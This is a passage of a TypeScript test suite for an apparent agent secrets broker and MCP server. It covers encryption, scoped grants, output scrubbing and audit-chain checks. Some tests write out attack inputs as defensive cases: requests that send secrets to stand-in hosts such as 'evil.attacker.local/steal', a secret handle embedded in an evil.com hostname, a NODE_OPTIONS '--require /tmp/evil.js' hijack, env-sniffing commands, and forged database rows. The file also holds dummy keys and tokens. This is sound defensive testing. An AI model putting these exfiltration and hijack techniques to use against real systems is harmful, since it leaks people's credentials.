import * as assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdtempSync, rmSync } from 'node:fs';
import {
  createServer,
  request as httpRequest,
  type IncomingHttpHeaders,
  type IncomingMessage,
  type ServerResponse,
} from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import { PassThrough } from 'node:stream';
import { describe, test } from 'node:test';
import { runRedBlueBenchmark } from './benchmark.ts';
import { PasswordOneBroker } from './broker.ts';
import { runRemoteCli } from './cli.ts';
import {
  computePolicyHash,
  decryptSecretEnvelope,
  deriveKek,
  encryptSecretEnvelope,
  normalizePolicy,
} from './crypto.ts';
import { MCP_TOOLS_DEFINITION, PasswordOneMcpDispatcher, runMcpServer, type JsonRpcResponse } from './mcp.ts';
import { OutputScrubber } from './scrubber.ts';
import {
  DEFAULT_DEV_MASTER_KEY,
  isLoopbackHost,
  SERVICE_VERSION,
  startPasswordOneServer,
} from './server.ts';
import {
  LeaseError,
  PasswordOneError,
  PolicyTamperError,
  PolicyViolationError,
} from './types.ts';
import { hostMatchesAny, PasswordOneVault } from './vault.ts';

async function httpRawRequest(params: {
  baseUrl: string;
  method: string;
  path: string;
  headers?: Record<string, string>;
  body?: unknown;
  rawBody?: string;
}): Promise<{ status: number; headers: IncomingHttpHeaders; text: string; json: any }> {
  const url = new URL(params.path, params.baseUrl);
  const payload =
    params.rawBody !== undefined
      ? params.rawBody
      : params.body !== undefined
        ? JSON.stringify(params.body)
        : undefined;
  const reqHeaders: Record<string, string | number> = {
    ...(params.headers ?? {}),
  };
  if (payload !== undefined) {
    if (!Object.keys(reqHeaders).some((k) => k.toLowerCase() === 'content-type')) {
      reqHeaders['content-type'] = 'application/json';
    }
    reqHeaders['content-length'] = Buffer.byteLength(payload, 'utf8');
  }
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      {
        hostname: url.hostname,
        port: Number(url.port),
        path: `${url.pathname}${url.search}`,
        method: params.method,
        headers: reqHeaders,
      },
      (res: IncomingMessage) => {
        const chunks: Buffer[] = [];
        res.on('data', (c: Buffer) => chunks.push(c));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf8');
          let json: any = undefined;
          if (text.length > 0) {
            try {
              json = JSON.parse(text);
            } catch {
              json = undefined;
            }
          }
          resolve({
            status: res.statusCode ?? 0,
            headers: res.headers,
            text,
            json,
          });
        });
      }
    );
    req.on('error', reject);
    if (payload !== undefined) req.write(payload, 'utf8');
    req.end();
  });
}

async function httpJsonRequest(params: {
  baseUrl: string;
  method: string;
  path: string;
  body?: unknown;
}): Promise<{ status: number; data: Record<string, any> }> {
  const url = new URL(params.path, params.baseUrl);
  const payload = params.body !== undefined ? JSON.stringify(params.body) : undefined;
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      {
        hostname: url.hostname,
        port: Number(url.port),
        path: `${url.pathname}${url.search}`,
        method: params.method,
        headers: payload
          ? {
              'content-type': 'application/json',
              'content-length': Buffer.byteLength(payload, 'utf8'),
            }
          : {},
      },
      (res: IncomingMessage) => {
        const chunks: Buffer[] = [];
        res.on('data', (c: Buffer) => chunks.push(c));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf8');
          resolve({
            status: res.statusCode ?? 0,
            data: JSON.parse(text) as Record<string, any>,
          });
        });
      }
    );
    req.on('error', reject);
    if (payload) req.write(payload, 'utf8');
    req.end();
  });
}

describe('Layer 1: Cryptographic Envelope & Policy AAD Binding', () => {
  test('1. scrypt + HKDF-SHA256 + AES-256-GCM round-trip succeeds and isolates versions', () => {
    const kek = deriveKek('test-master-passphrase-123', Buffer.from('0123456789abcdef0123456789abcdef'), 1024);
    const policy = normalizePolicy({ allowedHosts: ['api.stripe.com'], allowedTools: ['http'] });
    const policyHash = computePolicyHash(policy);

    const envV1 = encryptSecretEnvelope({
      kek,
      secretId: 'sec_01',
      alias: 'stripe/prod',
      version: 1,
      policyHash,
      plaintext: 'sk_' + 'live_SuperSecretValue123',
    });

    assert.notEqual(envV1.ciphertext, 'sk_' + 'live_SuperSecretValue123');
    const decrypted = decryptSecretEnvelope({
      kek,
      secretId: 'sec_01',
      alias: 'stripe/prod',
      version: 1,
      policyHash,
      envelope: envV1,
    });
    assert.equal(decrypted, 'sk_' + 'live_SuperSecretValue123');

    // Wrong version fails HKDF + AAD
    assert.throws(() => {
      decryptSecretEnvelope({
        kek,
        secretId: 'sec_01',
        alias: 'stripe/prod',
        version: 2,
        policyHash,
        envelope: envV1,
      });
    }, PolicyTamperError);
  });

  test('2. AAD rejects decryption when policyHash or alias is modified', () => {
    const kek = deriveKek('test-master-passphrase-123', Buffer.from('abcdef0123456789abcdef0123456789'), 1024);
    const origPolicy = normalizePolicy({ allowedHosts: ['api.stripe.com'], allowedTools: ['http'] });
    const tamperedPolicy = normalizePolicy({ allowedHosts: ['api.stripe.com', 'evil.com'], allowedTools: ['http'] });

    const envelope = encryptSecretEnvelope({
      kek,
      secretId: 'sec_02',
      alias: 'stripe/prod',
      version: 1,
      policyHash: computePolicyHash(origPolicy),
      plaintext: 'sk_' + 'live_OriginalSecret999',
    });

    assert.throws(() => {
      decryptSecretEnvelope({
        kek,
        secretId: 'sec_02',
        alias: 'stripe/prod',
        version: 1,
        policyHash: computePolicyHash(tamperedPolicy),
        envelope,
      });
    }, PolicyTamperError);

    assert.throws(() => {
      decryptSecretEnvelope({
        kek,
        secretId: 'sec_02',
        alias: 'stripe/renamed',
        version: 1,
        policyHash: computePolicyHash(origPolicy),
        envelope,
      });
    }, PolicyTamperError);
  });

  test('3. Host pattern validation enforces strict subdomain matching and rejects bare "*"', () => {
    assert.throws(() => {
      normalizePolicy({ allowedHosts: ['*'], allowedTools: ['http'] });
    }, PasswordOneError);

    assert.equal(hostMatchesAny('api.stripe.com', ['*.stripe.com']), true);
    assert.equal(hostMatchesAny('files.us.stripe.com', ['*.stripe.com']), true);
    assert.equal(hostMatchesAny('stripe.com', ['*.stripe.com']), false);
    assert.equal(hostMatchesAny('evilstripe.com', ['*.stripe.com']), false);
  });
});

describe('Layer 1 & 2: SQLite Vault Lifecycle, Tamper Resistance & Scoped Grants', () => {
  test('4. Vault CRUD, secret rotation, and sanitized metadata projection', () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'vault-test-key-2026', scryptN: 1024 });
    try {
      const v1 = vault.upsertSecret({
        alias: 'github/deploy_token',
        value: 'ghp_11223344556677889900aabbccddeeff',
        description: 'Repo deploy key',
        policy: { allowedHosts: ['api.github.com'], allowedTools: ['http'] },
      });
      assert.equal(v1.version, 1);
      assert.equal(v1.handle, 'pw1://github/deploy_token');
      assert.equal(v1.placeholder, '{{pw1://github/deploy_token}}');
      assert.equal('value' in v1, false);
      assert.equal('ciphertext' in v1, false);

      const v2 = vault.upsertSecret({
        alias: 'github/deploy_token',
        value: 'ghp_RotatedNewSecretValue998877665544',
        description: 'Rotated key',
        policy: { allowedHosts: ['api.github.com'], allowedTools: ['http'] },
      });
      assert.equal(v2.version, 2);
      assert.equal(vault.resolveSecretForBroker('github/deploy_token').plaintext, 'ghp_RotatedNewSecretValue998877665544');

      const listJson = JSON.stringify(vault.listSecrets());
      assert.equal(listJson.includes('ghp_'), false);

      assert.equal(vault.deleteSecret('github/deploy_token'), true);
      assert.equal(vault.listSecrets().length, 0);
    } finally {
      vault.close();
    }
  });

  test('5. Opening an existing SQLite vault with an incorrect master key is rejected', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-keytest-'));
    const dbPath = join(dir, 'vault.sqlite');
    try {
      const v1 = new PasswordOneVault({ dbPath, masterKey: 'correct-master-key-1234', scryptN: 1024 });
      v1.upsertSecret({
        alias: 'stripe/key',
        value: 'sk_' + 'live_1234567890abcdef',
        policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] },
      });
      v1.close();

      assert.throws(() => {
        new PasswordOneVault({ dbPath, masterKey: 'wrong-master-key-9999', scryptN: 1024 });
      }, PasswordOneError);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('6. Direct SQLite tampering of allowed_hosts_json + policy_hash triggers PolicyTamperError', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-tamper-'));
    const dbPath = join(dir, 'vault.sqlite');
    try {
      const vault = new PasswordOneVault({ dbPath, masterKey: 'tamper-test-master-key', scryptN: 1024 });
      const meta = vault.upsertSecret({
        alias: 'prod/payment',
        value: 'sk_' + 'live_ProdImmutablePolicySecret',
        policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] },
      });

      // External attacker rewrites both allowed_hosts_json and policy_hash directly in SQLite
      const forgedPolicy = { ...meta.policy, allowedHosts: ['api.stripe.com', 'attacker.evil.org'] };
      const rawDb = new DatabaseSync(dbPath);
      rawDb
        .prepare('UPDATE secrets SET allowed_hosts_json = ?, policy_hash = ? WHERE alias = ?')
        .run(JSON.stringify(forgedPolicy.allowedHosts), computePolicyHash(forgedPolicy), 'prod/payment');
      rawDb.close();

      assert.throws(() => {
        vault.resolveSecretForBroker('prod/payment');
      }, PolicyTamperError);

      const logs = vault.listAuditLogs(5);
      assert.equal(logs[0]?.action, 'TAMPER_DETECTED');
      assert.equal(logs[0]?.decision, 'DENY');
      vault.close();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('7. Scoped grants enforce agentId binding, host/tool subsetting, and maxUses exhaustion', () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'grant-test-key-2026', scryptN: 1024 });
    try {
      vault.upsertSecret({
        alias: 'partner/api_key',
        value: 'pk_secret_998877665544',
        policy: {
          allowedHosts: ['*.partner.com'],
          allowedTools: ['http'],
          maxLeaseTtlSeconds: 120,
          requireGrant: true,
        },
      });

      // Reject grant escalating beyond secret's allowedHosts or allowedTools
      assert.throws(() => {
        vault.createGrant({
          alias: 'partner/api_key',
          agentId: 'agent-1',
          allowedHosts: ['evil.com'],
        });
      }, PolicyViolationError);

      assert.throws(() => {
        vault.createGrant({
          alias: 'partner/api_key',
          agentId: 'agent-1',
          allowedTools: ['exec'],
        });
      }, PolicyViolationError);

      // Valid narrower subdomain grant with maxUses=2
      const grant = vault.createGrant({
        alias: 'partner/api_key',
        agentId: 'agent-1',
        allowedHosts: ['billing.partner.com'],
        maxUses: 2,
        ttlSeconds: 60,
      });

      // Wrong agentId rejected
      assert.throws(() => {
        vault.consumeGrant({
          grantId: grant.grantId,
          alias: 'partner/api_key',
          agentId: 'rogue-agent-2',
          tool: 'http',
          targetHost: 'billing.partner.com',
        });
      }, LeaseError);

      // Host outside grant's narrowed scope rejected (even though allowed by parent secret!)
      assert.throws(() => {
        vault.consumeGrant({
          grantId: grant.grantId,
          alias: 'partner/api_key',
          agentId: 'agent-1',
          tool: 'http',
          targetHost: 'other.partner.com',
        });
      }, LeaseError);

      // Consume 2 valid uses, then 3rd fails
      vault.consumeGrant({
        grantId: grant.grantId,
        alias: 'partner/api_key',
        agentId: 'agent-1',
        tool: 'http',
        targetHost: 'billing.partner.com',
      });
      vault.consumeGrant({
        grantId: grant.grantId,
        alias: 'partner/api_key',
        agentId: 'agent-1',
        tool: 'http',
        targetHost: 'billing.partner.com',
      });
      assert.throws(() => {
        vault.consumeGrant({
          grantId: grant.grantId,
          alias: 'partner/api_key',
          agentId: 'agent-1',
          tool: 'http',
          targetHost: 'billing.partner.com',
        });
      }, LeaseError);
    } finally {
      vault.close();
    }
  });
});

describe('Layer 4: 6-Encoding Bidirectional Output Scrubber', () => {
  test('8. Scrubs raw, URL-encoded (%5F & RFC3986), Std Base64, URL-Safe Base64, and JSON-escaped forms', () => {
    const scrubber = new OutputScrubber();
    const secret = 'sk_' + 'live_"quote"\\slash+val/99=';
    const active = [{ alias: 'test/complex', value: secret }];

    const rawForm = secret;
    const urlStd = encodeURIComponent(secret);
    const urlPct = secret.replace(/_/g, '%5F');
    const b64Std = Buffer.from(secret, 'utf8').toString('base64');
    const b64Url = Buffer.from(secret, 'utf8').toString('base64url');
    const jsonEsc = JSON.stringify(secret).slice(1, -1);

    const composite = [
      `1:${rawForm}`,
      `2:${urlStd}`,
      `3:${urlPct}`,
      `4:${b64Std}`,
      `5:${b64Url}`,
      `6:${jsonEsc}`,
    ].join(' | ');

    const res = scrubber.scrub(composite, active);
    assert.equal(res.redactionsCount >= 6, true);
    assert.deepEqual(res.redactedAliases, ['test/complex']);
    for (const needle of [rawForm, urlStd, urlPct, b64Std, b64Url, jsonEsc]) {
      assert.equal(res.scrubbedText.includes(needle), false, `Failed to scrub variant: ${needle}`);
    }
  });

  test('9. Scrubs HTTP Basic-Auth across all 3 Base64 byte-alignment phases (u:s, ab:s, usr:s)', () => {
    const scrubber = new OutputScrubber();
    const secret = 'pw1_BasicPhaseSecret_2026!';
    const active = [{ alias: 'auth/basic', value: secret }];

    const phase0 = Buffer.from(`ab:${secret}`, 'utf8').toString('base64'); // (2+1)%3 == 0
    const phase1 = Buffer.from(`usr:${secret}`, 'utf8').toString('base64'); // (3+1)%3 == 1
    const phase2 = Buffer.from(`u:${secret}`, 'utf8').toString('base64'); // (1+1)%3 == 2

    const input = `Headers: Authorization: Basic ${phase0}, Fallback=${phase1}, Alt=${phase2}`;
    const res = scrubber.scrub(input, active);

    assert.equal(res.scrubbedText.includes(phase0), false);
    assert.equal(res.scrubbedText.includes(phase1), false);
    assert.equal(res.scrubbedText.includes(phase2), false);
    assert.equal(res.scrubbedText.includes('Basic [REDACTED:pw1://auth/basic]'), true);
  });

  test('10. Heuristic regex defense-in-depth & scrubber idempotence', () => {
    const scrubber = new OutputScrubber();
    const unregisteredLeak = [
      'Unregistered GitHub=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456',
      'AWS=AKIAIOSFODNN7EXAMPLE',
      'JWT=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U',
      '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC\n-----END PRIVATE KEY-----',
    ].join('\n');

    const first = scrubber.scrub(unregisteredLeak, [{ alias: 'known/s', value: 'known_secret_val' }]);
    assert.equal(first.redactionsCount, 4);
    assert.equal(first.scrubbedText.includes('ghp_'), false);
    assert.equal(first.scrubbedText.includes('AKIAIOSFODNN7EXAMPLE'), false);
    assert.equal(first.scrubbedText.includes('BEGIN PRIVATE KEY'), false);

    // Idempotence check: re-scrubbing scrubbed text yields 0 new redactions and identical text
    const second = scrubber.scrub(first.scrubbedText, [{ alias: 'known/s', value: 'known_secret_val' }]);
    assert.equal(second.redactionsCount, 0);
    assert.equal(second.scrubbedText, first.scrubbedText);
  });
});

describe('Layer 3: Outbound Blind HTTP & Subprocess Execution Gateways', () => {
  test('11. Blind HTTP Gateway blocks SSRF host mismatch, userinfo authority tricks, Host spoofing, and DNS handle exfil', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'http-guard-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'stripe/key',
      value: 'sk_' + 'live_HttpGuardSecret999',
      policy: { allowedHosts: ['api.stripe.internal'], allowedTools: ['http'], allowHttp: true },
    });
    const broker = new PasswordOneBroker(vault);

    try {
      // 1. Disallowed host (SSRF)
      await assert.rejects(
        broker.executeHttp({
          url: 'http://evil.attacker.local/steal',
          auth: { type: 'bearer', secret: 'pw1://stripe/key' },
        }),
        PolicyViolationError
      );

      // 2. Embedded userinfo authority confusion
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.stripe.internal@evil.attacker.local/steal',
          auth: { type: 'bearer', secret: 'pw1://stripe/key' },
        }),
        PolicyViolationError
      );

      // 3. Host header spoofing
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.stripe.internal/v1/charges',
          headers: { Host: 'evil.attacker.local' },
          auth: { type: 'bearer', secret: 'pw1://stripe/key' },
        }),
        PolicyViolationError
      );

      // 4. Secret handle inside DNS hostname
      await assert.rejects(
        broker.executeHttp({
          url: 'http://{{pw1://stripe/key}}.evil.com/ping',
        }),
        PolicyViolationError
      );
    } finally {
      vault.close();
    }
  });

  test('12. Blind HTTP Gateway handles 302 cross-origin redirects in both "block" and "strip" modes', async () => {
    let collectorAuthHeader: string | undefined;
    let collectorCookieHeader: string | undefined;
    let collectorHitCount = 0;

    const originA = createServer((_req: IncomingMessage, res: ServerResponse) => {
      res.writeHead(302, { Location: 'http://cdn.external.local/public-asset' });
      res.end();
    });
    const originB = createServer((req: IncomingMessage, res: ServerResponse) => {
      collectorHitCount += 1;
      collectorAuthHeader = typeof req.headers['authorization'] === 'string' ? req.headers['authorization'] : undefined;
      collectorCookieHeader = typeof req.headers['cookie'] === 'string' ? req.headers['cookie'] : undefined;
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ publicAsset: true }));
    });

    await Promise.all([
      new Promise<void>((r) => originA.listen(0, '127.0.0.1', r)),
      new Promise<void>((r) => originB.listen(0, '127.0.0.1', r)),
    ]);
    const portA = (originA.address() as AddressInfo).port;
    const portB = (originB.address() as AddressInfo).port;

    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'redir-test-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'api/strict_key',
      value: 'sk_' + 'live_StrictRedirectKey111',
      policy: {
        allowedHosts: ['api.origin-a.local'],
        allowedTools: ['http'],
        allowHttp: true,
        crossOriginRedirect: 'block',
      },
    });
    vault.upsertSecret({
      alias: 'api/strip_key',
      value: 'sk_' + 'live_StripRedirectKey222',
      policy: {
        allowedHosts: ['api.origin-a.local'],
        allowedTools: ['http'],
        allowHttp: true,
        crossOriginRedirect: 'strip',
      },
    });

    const broker = new PasswordOneBroker(vault, {
      resolveOverrides: {
        'api.origin-a.local': { address: '127.0.0.1', port: portA },
        'cdn.external.local': { address: '127.0.0.1', port: portB },
      },
    });

    try {
      // Mode 1: 'block' aborts before connecting to cdn.external.local
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.origin-a.local/download',
          auth: { type: 'bearer', secret: 'pw1://api/strict_key' },
        }),
        PolicyViolationError
      );
      assert.equal(collectorHitCount, 0);

      // Mode 2: 'strip' follows redirect to fetch public asset AFTER stripping Authorization, Cookie & secret headers
      const res = await broker.executeHttp({
        url: 'http://api.origin-a.local/download',
        headers: {
          Cookie: 'session=abc',
          'X-Api-Secret': '{{pw1://api/strip_key}}',
        },
        auth: { type: 'bearer', secret: 'pw1://api/strip_key' },
      });
      assert.equal(res.status, 200);
      assert.equal(collectorHitCount, 1);
      assert.equal(collectorAuthHeader, undefined);
      assert.equal(collectorCookieHeader, undefined);
      assert.equal(res.redirects.length, 1);
      assert.equal(res.redirects[0]?.crossOrigin, true);
      assert.equal(res.redirects[0]?.strippedCredentials, true);
    } finally {
      vault.close();
      await Promise.all([
        new Promise<void>((r) => originA.close(() => r())),
        new Promise<void>((r) => originB.close(() => r())),
      ]);
    }
  });

  test('13. Blind Subprocess Gateway isolates ambient process.env, blocks printenv/LD_PRELOAD, and scrubs stderr', async () => {
    process.env.PW1_AMBIENT_HOST_SECRET_TEST = 'ambient_host_secret_do_not_inherit';
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'exec-test-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'cli/token',
      value: 'cli_tok_SecretSubprocess998877',
      policy: {
        allowedTools: ['exec'],
        allowedCommands: ['node'],
        allowEnvInjection: true,
      },
    });
    const broker = new PasswordOneBroker(vault);

    try {
      // 1. Block sniffing binaries
      for (const sniffCmd of ['env', 'printenv', '/usr/bin/env']) {
        await assert.rejects(
          broker.executeCommand({ command: sniffCmd }),
          PolicyViolationError
        );
      }

      // 2. Block unapproved binary (e.g. curl not in allowedCommands: ['node'])
      await assert.rejects(
        broker.executeCommand({
          command: 'curl',
          args: ['https://example.com'],
          secretEnv: { TOKEN: 'pw1://cli/token' },
        }),
        PolicyViolationError
      );

      // 3. Block runtime hijacking env vars
      await assert.rejects(
        broker.executeCommand({
          command: process.execPath,
          args: ['-v'],
          env: { NODE_OPTIONS: '--require /tmp/evil.js' },
        }),
        PolicyViolationError
      );

      // 4. Clean-room env check + multi-encoding stdout/stderr scrubbing
      const execRes = await broker.executeCommand({
        command: process.execPath,
        args: [
          '-e',
          [
            'console.log(JSON.stringify({ ambientInherited: Boolean(process.env.PW1_AMBIENT_HOST_SECRET_TEST), hasInjected: Boolean(process.env.CLI_TOK) }));',
            'console.error("Debug leak raw=" + process.env.CLI_TOK + " b64=" + Buffer.from(process.env.CLI_TOK).toString("base64"));',
          ].join(' '),
        ],
        secretEnv: { CLI_TOK: 'pw1://cli/token' },
      });

      assert.equal(execRes.exitCode, 0);
      const parsedOut = JSON.parse(execRes.stdout.trim()) as { ambientInherited: boolean; hasInjected: boolean };
      assert.equal(parsedOut.ambientInherited, false);
      assert.equal(parsedOut.hasInjected, true);
      assert.equal(execRes.stderr.includes('cli_tok_SecretSubprocess998877'), false);
      assert.equal(execRes.redactionsCount >= 2, true);
    } finally {
      delete process.env.PW1_AMBIENT_HOST_SECRET_TEST;
      vault.close();
    }
  });
});

describe('Layer 4: SHA-256 Hash-Chained Audit Ledger Tamper Detection', () => {
  test('14. Audit chain verifies intact history and detects SQLite row modification or deletion', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-audit-'));
    const dbPath = join(dir, 'audit.sqlite');
    try {
      const vault = new PasswordOneVault({ dbPath, masterKey: 'audit-chain-key-2026', scryptN: 1024 });
      vault.upsertSecret({
        alias: 'db/main',
        value: 'db_secret_AuditNeverStoresPlaintext',
        policy: { allowedTools: ['exec'], allowedCommands: ['node'], allowEnvInjection: true },
      });
      vault.appendAudit({
        action: 'TEST_EVENT',
        alias: 'db/main',
        decision: 'ALLOW',
        reason: 'Attempted leak in audit reason: db_secret_AuditNeverStoresPlaintext',
      });

      // Verify audit log scrubbed any accidental secret in reason!
      const rawLogs = JSON.stringify(vault.listAuditLogs(10));
      assert.equal(rawLogs.includes('db_secret_AuditNeverStoresPlaintext'), false);

      const intact = vault.verifyAuditChain();
      assert.equal(intact.valid, true);
      assert.equal(intact.entriesChecked, 2);

      // Tamper with audit_logs row in SQLite
      const attackerDb = new DatabaseSync(dbPath);
      attackerDb.prepare('UPDATE audit_logs SET decision = ? WHERE seq = 1').run('ALLOW');
      attackerDb.close();

      const tampered = vault.verifyAuditChain();
      assert.equal(tampered.valid, false);
      assert.equal(tampered.brokenAtSeq, 1);
      vault.close();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('HTTP REST Microservice & JSON-RPC MCP Server E2E', () => {
  test('15. HTTP Server full API contract (/health, /v1/secrets, /v1/grants, /v1/proxy/*, /v1/scrub, /v1/audit)', async () => {
    const upstream = createServer((req: IncomingMessage, res: ServerResponse) => {
      const auth = String(req.headers['authorization'] ?? '');
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: auth === 'Bearer sk_' + 'live_HttpE2ESecret777', echoed: auth }));
    });
    await new Promise<void>((r) => upstream.listen(0, '127.0.0.1', r));
    const upPort = (upstream.address() as AddressInfo).port;

    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'http-server-e2e-key',
      scryptN: 1024,
      brokerOptions: {
        resolveOverrides: {
          'api.e2e.internal': { address: '127.0.0.1', port: upPort },
        },
      },
    });

    try {
      const health1 = await httpJsonRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/health' });
      assert.equal(health1.status, 200);
      assert.equal(health1.data.service, 'password-one');
      assert.equal(health1.data.auditChainValid, true);

      // Create secret with slash in alias
      const createRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/secrets',
        body: {
          alias: 'stripe/e2e_key',
          value: 'sk_' + 'live_HttpE2ESecret777',
          description: 'E2E Stripe key',
          policy: {
            allowedHosts: ['api.e2e.internal'],
            allowedTools: ['http', 'exec'],
            allowedCommands: ['node'],
            allowHttp: true,
            allowEnvInjection: true,
            requireGrant: true,
          },
        },
      });
      assert.equal(createRes.status, 201);
      assert.equal(createRes.data.secret.handle, 'pw1://stripe/e2e_key');

      // List secrets returns metadata only
      const listRes = await httpJsonRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/v1/secrets' });
      assert.equal(listRes.status, 200);
      assert.equal(listRes.data.secrets.length, 1);
      assert.equal(JSON.stringify(listRes.data).includes('sk_' + 'live_HttpE2ESecret777'), false);

      // Issue grant
      const grantRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/grants',
        body: {
          alias: 'stripe/e2e_key',
          agentId: 'e2e-agent',
          maxUses: 3,
          ttlSeconds: 120,
        },
      });
      assert.equal(grantRes.status, 201);
      const grantId = String(grantRes.data.grant.grantId);
      assert.match(grantId, /^grant_/);

      // Execute blind HTTP request
      const proxyHttp = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/proxy/http',
        body: {
          url: 'http://api.e2e.internal/test',
          auth: { type: 'bearer', secret: 'pw1://stripe/e2e_key' },
          agentId: 'e2e-agent',
          grantId,
        },
      });
      assert.equal(proxyHttp.status, 200);
      const parsedBody = JSON.parse(String(proxyHttp.data.result.body));
      assert.equal(parsedBody.ok, true);
      assert.equal(String(proxyHttp.data.result.body).includes('sk_' + 'live_HttpE2ESecret777'), false);

      // Execute blind subprocess
      const proxyExec = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/proxy/exec',
        body: {
          command: process.execPath,
          args: ['-e', 'process.stdout.write("len=" + process.env.MY_KEY.length)'],
          secretEnv: { MY_KEY: 'pw1://stripe/e2e_key' },
          agentId: 'e2e-agent',
          grantId,
        },
      });
      assert.equal(proxyExec.status, 200);
      assert.equal(proxyExec.data.result.stdout, 'len=24');

      // Standalone /v1/scrub
      const scrubRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/scrub',
        body: {
          text: `Echoed b64=${Buffer.from('sk_' + 'live_HttpE2ESecret777').toString('base64')}`,
        },
      });
      assert.equal(scrubRes.status, 200);
      assert.equal(scrubRes.data.result.redactionsCount, 1);

      // Audit endpoint
      const auditRes = await httpJsonRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/v1/audit?limit=50' });
      assert.equal(auditRes.status, 200);
      assert.equal(auditRes.data.verification.valid, true);

      // Delete secret with slash path
      const delRes = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'DELETE',
        path: '/v1/secrets/stripe/e2e_key',
      });
      assert.equal(delRes.status, 200);
      assert.equal(delRes.data.deleted, true);
    } finally {
      await srv.close();
      await new Promise<void>((r) => upstream.close(() => r()));
    }
  });

  test('16. HTTP POST /v1/benchmark executes full benchmark suite online', async () => {
    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'bench-endpoint-key',
      scryptN: 1024,
    });
    try {
      const res = await httpJsonRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/benchmark',
        body: { microIterations: 25 },
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.ok, true);
      assert.equal(res.data.report.scorecards.password_one.attackDefenseRatePct, 100);
    } finally {
      await srv.close();
    }
  });

  test('17. MCP Server over JSON-RPC stdio exposes zero plaintext-read tools and enforces policies', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'mcp-test-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'openai/prod_key',
      value: 'sk-proj-McpSecretValue998877665544',
      policy: { allowedHosts: ['api.openai.com'], allowedTools: ['http'] },
    });
    const broker = new PasswordOneBroker(vault);
    const dispatcher = new PasswordOneMcpDispatcher(vault, broker);

    const input = new PassThrough();
    const output = new PassThrough();
    const mcp = await runMcpServer({ input, output, vault, broker });

    try {
      // Architectural check: no tool allows reading/decrypting raw secret
      const toolNames = MCP_TOOLS_DEFINITION.map((t) => t.name);
      assert.deepEqual(toolNames, [
        'pw1_list_handles',
        'pw1_http_request',
        'pw1_exec_command',
        'pw1_scrub_output',
        'pw1_audit_verify',
      ]);

      const initRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 1,
        method: 'initialize',
      });
      assert.equal((initRes?.result as Record<string, any>).serverInfo.name, '@opc/password-one');

      const handlesRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 2,
        method: 'tools/call',
        params: { name: 'pw1_list_handles', arguments: {} },
      });
      const handlesText = String((handlesRes?.result as any).content[0].text);
      assert.equal(handlesText.includes('pw1://openai/prod_key'), true);
      assert.equal(handlesText.includes('sk-proj-McpSecretValue998877665544'), false);

      // Attempting imaginary plaintext tool fails cleanly
      const readAttempt = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 3,
        method: 'tools/call',
        params: { name: 'pw1_get_plaintext_secret', arguments: { alias: 'openai/prod_key' } },
      });
      assert.equal((readAttempt?.result as any).isError, true);

      // Test live stream transport
      const responsePromise = new Promise<JsonRpcResponse>((resolve) => {
        output.once('data', (chunk: Buffer) => {
          resolve(JSON.parse(chunk.toString('utf8').trim()) as JsonRpcResponse);
        });
      });
      input.write(
        `${JSON.stringify({
          jsonrpc: '2.0',
          id: 99,
          method: 'tools/call',
          params: {
            name: 'pw1_scrub_output',
            arguments: { text: 'Leaked sk-proj-McpSecretValue998877665544 in trace' },
          },
        })}\n`
      );
      const streamRes = await responsePromise;
      assert.equal(streamRes.id, 99);
